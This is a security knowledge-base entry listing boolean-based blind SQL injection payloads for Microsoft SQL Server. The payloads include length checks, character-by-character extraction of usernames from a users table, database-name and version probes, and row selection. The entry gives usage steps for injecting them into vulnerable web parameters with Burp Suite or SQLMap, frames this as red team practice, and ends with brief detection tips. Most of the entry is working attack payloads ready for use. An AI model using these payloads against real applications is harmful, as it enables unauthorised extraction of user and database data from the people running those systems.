---
type: code
language: sql
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - sql-injection
  - mssql
  - blind
validated: true
---

# MSSQL-Blind-Injection-Queries

## Code

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

## Description

This collection of SQL query snippets is used for boolean-based blind SQL injection in MSSQL databases. They perform checks on data lengths, character values, database metadata, version verification, and row selection without producing direct output, relying on application response changes to infer results.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| tblusers | Target table name for user data extraction | users |
| username | Column name to extract | login |
| db_name(0) | Current database name function | master |
| log_table | Table for row-based queries | errorlog |

No runtime variables in the code itself; customize table/column names as needed for the target schema.

## Usage

Inject these snippets into vulnerable parameters (e.g., via Burp Suite or SQLMap) in a web application. Start with length checks to determine field sizes, then use ASCII/UNICODE comparisons for character-by-character extraction. For version checks, observe if the app behaves as if the condition is true. Use in red team exercises to simulate data exfiltration from MSSQL-backed apps.

## Detection

- Monitor application logs for repeated conditional queries (e.g., AND 1=1 patterns).
- Database query logs showing ISNULL, SUBSTRING, or ASCII functions in user inputs.
- Anomalous response time variations or error rates indicating boolean probing.
- WAF alerts on SQL keywords like LEN, @@version, or TOP in payloads.

## Related

- [[procedures/MSSQL-Blind-SQL-Injection]]
- [[tools/sqlmap]]
